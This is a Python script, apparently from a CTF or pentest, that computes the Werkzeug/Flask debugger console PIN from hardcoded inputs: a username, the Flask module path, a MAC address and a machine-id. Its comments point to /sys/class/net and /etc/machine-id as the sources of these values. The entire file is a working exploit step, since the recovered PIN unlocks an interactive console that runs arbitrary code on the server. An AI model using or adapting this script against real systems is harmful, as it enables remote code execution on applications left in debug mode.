from requests import request
from hashlib import md5
from base64 import b64encode
from itertools import chain

probably_public_bits = [
    'ubuntu',
    'flask.app',
    'Flask',
    '/home/ubuntu/.local/lib/python3.8/site-packages/flask/app.py'
    ]

# uuid.getnode() -> /sys/class/net/<interface>/address
# get_machine_id() -> /etc/machine-id
# private_bits = [str(uuid.getnode()), get_machine_id()]
private_bits = [
    '02:42:ac:11:00:02',
    'b0484730-5dc9-410b-be16-ec5525f1bc3d'    
    ]

h = md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
